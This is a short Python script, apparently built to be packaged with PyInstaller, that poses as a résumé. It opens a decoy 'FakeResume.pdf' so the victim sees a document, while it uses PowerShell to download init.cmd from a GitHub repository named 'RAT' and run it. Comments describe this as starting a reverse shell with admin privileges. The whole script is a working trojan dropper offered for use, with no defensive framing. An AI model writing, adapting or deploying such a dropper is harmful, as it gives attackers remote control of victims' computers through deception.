import subprocess
import os
import sys
import socket
import threading
import webbrowser


def open_pdf():
    # Determine the correct path to the PDF file
    if hasattr(sys, "_MEIPASS"):
        # Running as a PyInstaller bundle
        base_path = sys._MEIPASS
    else:
        # Running normally
        base_path = os.path.dirname(__file__)

    pdf_path = os.path.join(base_path, "FakeResume.pdf")

    # Open the PDF file
    webbrowser.open(pdf_path)


# Start PDF and reverse shell
threading.Thread(target=open_pdf).start()
command = [
    "powershell.exe",
    "-Command",
    "Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/init.cmd -OutFile init.cmd"
]

command2 = [
    "powershell.exe",
    "-Command",
    ".\\init.cmd"
]

subprocess.run(command)
subprocess.run(command2)

## run our admin privlige function i.e. wget and init.cmd .\init.cmd
